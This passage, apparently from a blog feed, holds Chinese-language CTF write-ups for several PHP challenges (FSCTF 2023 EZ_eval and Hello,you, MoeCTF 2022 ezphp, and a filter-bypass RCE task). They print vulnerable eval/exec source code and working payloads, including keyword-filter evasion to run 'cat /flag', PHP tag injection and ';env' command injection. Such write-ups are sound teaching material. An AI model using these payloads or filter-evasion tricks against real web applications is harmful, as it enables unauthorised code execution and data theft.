</div></li>
</ul>
</li>
<li>
<p>对于黑名单绕过</p>
<p>常规的<code>cat /flag</code>都不能使用了</p>
<div class="alert alert-note"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>Note</p><p><p><strong>知识点</strong></p>
<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数</p>
</div><p>传参为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</span></span></code></pre></td></tr></table>
</div>
</div><p>黑名单还过滤了<code>[</code>，<code> ]</code></p>
<p>把这个替换为<code>{</code>，<code>}</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($_GET{a})($_GET{b})&amp;a=system&amp;b=cat /flag</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>对于白名单绕过</p>
<p>不在白名单的部分</p>
<ul>
<li>
<p><code>a</code></p>
</li>
<li>
<p><code>b</code></p>
</li>
<li>
<p><code>_GET</code></p>
<blockquote>
<p>因为<code>_GET</code>难绕过，下面单列来说</p>
</blockquote>
</li>
</ul>
<p><code>a</code>和<code>b</code>很好绕过：使用白名单的随便一个数学函数作为命名就行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($_GET{cos})($_GET{asinh})&amp;cos=system&amp;asinh=cat /flag</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p><code>_GET[]</code>绕过方法</p>
<blockquote>
<p>使用数学函数</p>
</blockquote>
<ul>
<li>
<p><code>hex2bin()</code></p>
<p>把十六进制字符串转换为ASCII字符</p>
<p><code>_GET</code> =&gt; <code>hex2bin(5f 47 45 54)</code></p>
<p>但问题是：<code>hex2bin</code>不在白名单；ascci字符码也会被第三道过滤</p>
</li>
<li>
<p><code>hex2bin</code>不在白名单解决</p>
<p>使用<code>base_convert()</code>函数来转换</p>
<blockquote>
<p><code>base_convert()</code>：任意进制之间转换数字</p>
</blockquote>
<p>使用方法：</p>
<p>hex2bin可以看做是36进制，用base_convert来转换将在<strong>10进制的数字转换为16进制</strong>就可以出现hex2bin。</p>
<p><code>hex2bin()</code> =&gt; <code>base_convert(37907361743,10,36)</code></p>
<p>里面的<code>5f 47 45 54</code>要用dechex()函数将<strong>10进制数转换为16进制</strong>的数</p>
<p><code>5f 47 45 54</code> =&gt; <code>dechex(1598506324)</code></p>
<p>经过上面修改变为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($((base_convert(37907361743,10,36))(dechex(1598506324))){cos})($(base_convert(37907361743,10,36))(dechex(1598506324))){asinh})&amp;cos=system&amp;asinh=cat /flag</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
</li>
<li>
<p>但这个指令太长了</p>
<p>综述再修改：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">base_convert(37907361743,10,36)		# “hex2bin”
</span></span><span class="line"><span class="cl">dechex(1598506324)		# “5f474554”
</span></span><span class="line"><span class="cl">$pi=hex2bin(5f474554)		# $pi=&#34;_GET&#34;
</span></span><span class="line"><span class="cl">($$pi){pi}(($$pi){abs})		# $_GET{pi}($_GET{abs})
</span></span><span class="line"><span class="cl">$_GET{pi}($_GET{abs})		# $_GET{system}($_GET{cat /flag})</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="payload" class="heading-element"><span>Payload</span>
 <a href="#payload" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>RCE</li>
<li>黑名单</li>
<li>白名单</li>
</ul>

item.title: 【FSCTF 2023】EZ_eval
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="fsctf-2023ez_eval" class="heading-element"><span>[FSCTF 2023]EZ_eval</span>
 <a href="#fsctf-2023ez_eval" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>源码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl"> if(isset($_GET[&#39;word&#39;])){
</span></span><span class="line"><span class="cl"> $word = $_GET[&#39;word&#39;];
</span></span><span class="line"><span class="cl"> if (preg_match(&#34;/cat|tac|tail|more|head|nl|flag|less| /&#34;, $word)){
</span></span><span class="line"><span class="cl"> die(&#34;nonono.&#34;);
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> $word = str_replace(&#34;?&#34;, &#34;&#34;, $word);
</span></span><span class="line"><span class="cl"> eval(&#34;?&gt;&#34;. $word);
</span></span><span class="line"><span class="cl">}else{
</span></span><span class="line"><span class="cl"> highlight_file(__FILE__);
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div><p>这里有三个问题</p>
<ul>
<li><code>?</code>过滤</li>
<li><code>eval</code>命令前加了php结束符，无法执行我们输入的指令</li>
<li>关键字过滤</li>
</ul>
<p>相对需要着急解决的是的 2，因为不解决啥也干不了。</p>
</li>
<li>
<p>对 2 解决方法</p>
<ul>
<li>
<p><code>&lt;? echo '123';?&gt;</code></p>
<p>但前提是前提是开启配置参数short_open_tags=on</p>
</li>
<li>
<p><code>&lt;script language=&quot;php&quot;&gt;echo 'hello';</code></p>
<p>不需要修改参数开关，但是只能在7.0以下可用</p>
</li>
<li>
<p><code>&lt;% echo '123';%&gt;</code></p>
<p>开启配置参数<code>asp_tags=on</code>，并且只能在7.0以下版本使用</p>
</li>
</ul>
</li>
<li>
<p>对 1 解决方法：2 的第二个解决方法就顺带解决了</p>
</li>
<li>
<p>对 3 解决方法</p>
<p>反斜杠绕过</p>
</li>
</ul>
<h2 id="payload" class="heading-element"><span>Payload</span>
 <a href="#payload" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?word=&lt;script%09language=&#34;php&#34;&gt;system(&#34;c\at%09/fl\ag&#34;);</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>RCE</li>
<li>eval执行时用了php的结束标志?&gt;绕过</li>
<li>WAF绕过</li>
</ul>

item.title: 【FSCTF 2023】Hello,you
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="fsctf-2023helloyou" class="heading-element"><span>[FSCTF 2023]Hello,you</span>
 <a href="#fsctf-2023helloyou" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><blockquote>
<p>我是在nss做的，好像原题flag位置不一样。</p>
<p>原题好像在根目录，但是nss这个在env</p>
</blockquote>
<h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>看页面源码可以得到部分源码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">$input = isset($_GET[&#39;input&#39;]) ? $_GET[&#39;input&#39;] : &#39;&#39;;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 执行命令并返回结果
</span></span><span class="line"><span class="cl">function executeCommand($command) {
</span></span><span class="line"><span class="cl">$output = &#39;&#39;;
</span></span><span class="line"><span class="cl">exec($command, $output);
</span></span><span class="line"><span class="cl">return $output;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 注册用户
</span></span><span class="line"><span class="cl">function registerUser($username) {
</span></span><span class="line"><span class="cl">// .........
</span></span><span class="line"><span class="cl">$command = &#34;echo Hello, &#34; . $username;
</span></span><span class="line"><span class="cl">$result = executeCommand($command);
</span></span><span class="line"><span class="cl">return $result;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 处理注册请求
</span></span><span class="line"><span class="cl">if (isset($_POST[&#39;submit&#39;])) {
</span></span><span class="line"><span class="cl">$username = $_POST[&#39;username&#39;];
</span></span><span class="line"><span class="cl">$result = registerUser($username);
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>可以知道是<code>exec</code>直接执行指令</p>
</li>
<li>
<p>直接使用指令无法输出</p>
<p>这里的解释是一次执行多个命令，命令之间需要用连接符连接</p>
<blockquote>
<p>好像是这么说的吧，不确定</p>
<p>但是肯定是前面要加<code>;</code>才能执行</p>
</blockquote>
</li>
<li>
<p>根目录没有要在环境里面找</p>
</li>
</ul>
<h2 id="payload" class="heading-element"><span>Payload</span>
 <a href="#payload" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">;ls
</span></span><span class="line"><span class="cl">;ls /
</span></span><span class="line"><span class="cl">;env</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>RCE</li>
</ul>

item.title: 【MoeCTF 2022】ezphp
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="moectf-2022ezphp" class="heading-element"><span>[MoeCTF 2022]ezphp</span>
 <a href="#moectf-2022ezphp" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>源码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">highlight_file(&#39;source.txt&#39;);
</span></span><span class="line"><span class="cl">echo &#34;&lt;br&gt;&lt;br&gt;&#34;;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$flag = &#39;xxxxxxxx&#39;;
</span></span><span class="line"><span class="cl">$giveme = &#39;can can need flag!&#39;;
</span></span><span class="line"><span class="cl">$getout = &#39;No! flag.Try again. Come on!&#39;;
</span></span><span class="line"><span class="cl">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){
</span></span><span class="line"><span class="cl"> exit($giveme);
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">if($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;){
</span></span><span class="line"><span class="cl"> exit($getout);
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">foreach ($_POST as $key =&gt; $value) {
</span></span><span class="line"><span class="cl"> $$key = $value;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">foreach ($_GET as $key =&gt; $value) {
</span></span><span class="line"><span class="cl"> $$key = $$value;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">echo &#39;the flag is : &#39; . $flag;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?&gt;</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>如果要echo，那么不能exit。但是那么必须传flag（get或者post），并且传入flag不能等于&quot;flag&quot;</p>
</li>
<li>
<p>如果要<code>$flag</code>的值不会被更改，那就得提前**“储存”**flag</p>
</li>
</ul>
<h2 id="rce" class="heading-element"><span>RCE</span>
 <a href="#rce" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><p><strong>超级二选一</strong>：GET或POST传参都可</p>
<p>GET</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?fff=flag&amp;flag=fff</span></span></code></pre></td></tr></table>
</div>
</div><p>POST</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">fff=flag&amp;flag=fff</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
